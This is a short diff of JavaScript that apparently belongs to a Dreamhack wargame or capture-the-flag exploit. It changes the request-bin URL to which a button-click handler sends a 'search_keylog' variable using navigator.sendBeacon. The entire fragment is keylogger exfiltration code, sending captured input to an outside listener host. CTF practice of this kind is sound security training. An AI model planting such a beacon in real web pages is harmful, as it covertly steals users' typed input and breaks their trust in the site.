@@ -10,7 +10,7 @@ const search_btn = document.getElementsByTagName("button")[0];
 search_btn.addEventListener("click", e => {
     e.preventDefault();
     navigator.sendBeacon(
-        "https://hbeqqxv.request.dreamhack.games",
+        "https://ainvyph.request.dreamhack.games",
         search_keylog
     );
 });
